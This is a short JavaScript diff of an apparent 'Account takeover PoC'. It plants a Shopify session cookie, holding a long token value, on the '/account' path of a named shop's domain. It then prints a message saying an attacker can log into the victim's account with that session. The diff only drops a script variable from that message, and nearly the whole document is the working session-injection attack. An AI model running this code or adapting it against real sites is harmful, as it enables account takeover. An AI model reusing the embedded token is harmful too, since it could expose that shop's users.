@@ -1,5 +1,5 @@
 document.cookie=`_shopify_essential=:AZoCgS7XAAH_NjBabmNhbVLYlEkELGWHn486mWb-syUs7L3vOv8zjAxCRbbodheCDy5rtEQT3Wsh5b6WNscmqIc47juLPYh77Qp_-fT974HAmGBPjPQEWYvMLQVEIEFnAsn39YRNNzk2Qi4NbRYsVcMp1eTph37rmaIPdyNZ0hc3Xl4166GGwdz4JQY_qzGSE8EDVoAywkbW6hUr8ME5xHzaCZNKtXPd4Ch4tG0Y4Nw4wFiVYM1oQkxp8UCSFo6jekZmF4ACUT4WOkEt8gePPGsoI53Eic0Gb3l54j3NsRj_obSSpFCf7khjZXiAemggyNOHqquZ7ebWxb4sAbw6EfUbyE1qmxLf2w7sKa9bT_IKw9ZSz9YUs4c_IoyHSJAOAK9pgyVf8ON3uOWQDNwl_1ysbhLFE-ounRTLbgYtEFDCd1xBo9dz_WrFszBHM4RqprmnjBqvkJPtbOTAjaU55la0nDl0nFVxShTcyW3rEtMGGJs71redkHkDS6ZO8UoieMy4CzrtyHSxkfGH4UgfQGUIU0NeLk0ZbuH-cmM2mZx_:; Path=/account; Domain=.oatsome.de`;
 
 document.open();
-document.write("<h3>Account takeover PoC => The attacker is able to log into your account by executing the following code that contains your session: </h3><br><br>" + script);
+document.write("<h3>Account takeover PoC => The attacker is able to log into your account by executing the following code that contains your session: </h3><br><br>");
 document.close();
